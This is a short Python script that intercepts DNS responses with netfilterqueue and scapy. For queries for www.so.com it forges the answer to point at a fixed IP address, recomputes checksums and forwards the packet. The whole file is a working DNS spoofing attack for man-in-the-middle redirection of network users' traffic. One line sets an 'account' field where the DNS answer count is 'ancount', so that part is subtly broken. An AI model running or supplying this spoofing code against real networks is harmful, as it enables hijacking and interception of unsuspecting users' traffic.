import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #if not scapy_packet.haslayer(scapy.DNSQR):
     #   packet.accept()
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if b"www.so.com" in qname:
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata="14.215.177.38")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].account = 1
            #scapy会自动计算矫验，加入answer
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            
            packet.set_payload(scapy.raw(scapy_packet))

    packet.accept()
    #else:
        #packet.accept()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
